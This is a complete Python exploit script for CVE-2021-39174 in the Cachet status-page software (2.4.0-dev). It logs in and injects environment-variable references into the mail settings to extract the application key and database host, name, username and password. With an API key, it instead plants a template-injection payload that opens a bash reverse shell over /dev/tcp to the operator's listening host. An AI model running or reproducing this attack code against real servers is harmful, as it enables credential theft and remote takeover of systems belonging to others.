import requests
import re
import argparse
import time

class Catchet():
    def __init__(self,target,username,password,key,lhost,lport):
        self.username = username
        self.password = password
        self.key = key
        self.lhost = lhost
        self.lport = lport
        self.login_url = target + "/auth/login"
        self.mail_url = target + "/dashboard/settings/mail"
        self.template_create_url = target + "/dashboard/templates/create"
        self.call_ssti_url = target + "/api/v1/incidents"

        self.session = requests.Session()
        self.token = self.gettoken()
        self.login()

        if args.k:
            self.create_template()
            self.call_ssti()
        else:
            self.exploit()
            self.extract()        
    
    def gettoken(self):
        requests.packages.urllib3.disable_warnings()
        print("Getting XSRF token:")
        try:
            login_page = self.session.get(self.login_url)
            token = re.findall('name="token" content="(.*)">',login_page.text)
            print("Token Found: " + token[0])
            return token[0]
        except IndexError:
            print("Unable to get token :(")

    def login(self):
        requests.packages.urllib3.disable_warnings()
        print("Loggin in")
        login_data = {
            "_token":self.token,
            "username":self.username,
            "password":self.password,
            "remember_me":"0"
        }

        login = self.session.post(self.login_url,data=login_data)

        if "Dashboard" in login.text:
            print("Logged in!")
        else:
            print("Unable to log in :(")
        
    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("Changing Mail Settings\n")

        mail_data = {
            "_token":self.token,
            "config[mail_driver]":"mail",
            "config[mail_host]":"",
            "config[mail_address]":"hacked@1.3.3.7<1>${APP_KEY}<2>${DB_HOST}<3>${DB_DATABASE}<4>${DB_USERNAME}<5>${DB_PASSWORD}<6>",
            "config[mail_username]":"",
            "config[mail_password]":""
        }

        self.session.post(self.mail_url,data=mail_data)

    def extract(self):
        requests.packages.urllib3.disable_warnings()
        print("Waiting 3 seconds: ")
        time.sleep(3)
        get_data = self.session.get(self.mail_url)
        print("Getting Data:\n")

        try:
            app_key = re.findall("&lt;1&gt;(.*)&lt;2&gt",get_data.text)
            localhost = re.findall("&lt;2&gt;(.*)&lt;3&gt",get_data.text)
            database = re.findall("&lt;3&gt;(.*)&lt;4&gt",get_data.text)
            db_username = re.findall("&lt;4&gt;(.*)&lt;5&gt",get_data.text)
            db_password = re.findall("&lt;5&gt;(.*)&lt;6&gt",get_data.text)

            print("App Key:",app_key[0])
            print("Database Host:",localhost[0])
            print("Database:",database[0])
            print("Database Username:",db_username[0])
            print("Database Password:",db_password[0])
        except IndexError:
            print("Unable to extract data :(")
        
    def create_template(self):
        requests.packages.urllib3.disable_warnings()
        print("Creating SSTI Template:")
        create_data = {
            "_token":self.token,
            "name":"hacked",
            "template":'{{["bash -c \'bash -i >& /dev/tcp/' + self.lhost + '/' + self.lport + ' 0>&1\'"]|filter("system")}}'
        }
        self.session.post(self.template_create_url, data=create_data, allow_redirects = False)
    
    def call_ssti(self):
        requests.packages.urllib3.disable_warnings()
        print("Executing SSTI:")
        call_data = {
            "visible":"0",
            "status":"1",
            "name":"rse",
            "template":"hacked"
        }
        
        api_header = {
            "X-Cachet-Token":self.key
        }
        requests.post(self.call_ssti_url,data=call_data,headers=api_header)

if __name__=="__main__":
    print("CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure")
    parser = argparse.ArgumentParser(description='CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure')

    parser.add_argument('-t', metavar='<Login URL>', help='Target/host URL, E.G: http://cachet.site/', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-k', metavar='<API Key>', help='The API Key', required=False)
    parser.add_argument('-lhost', metavar='<listening host>', help='Your IP Address', required=False)
    parser.add_argument('-lport', metavar='<listening port>', help='Your Listening Port', required=False)
    args = parser.parse_args()

    try:
        Catchet(args.t,args.u,args.p,args.k,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()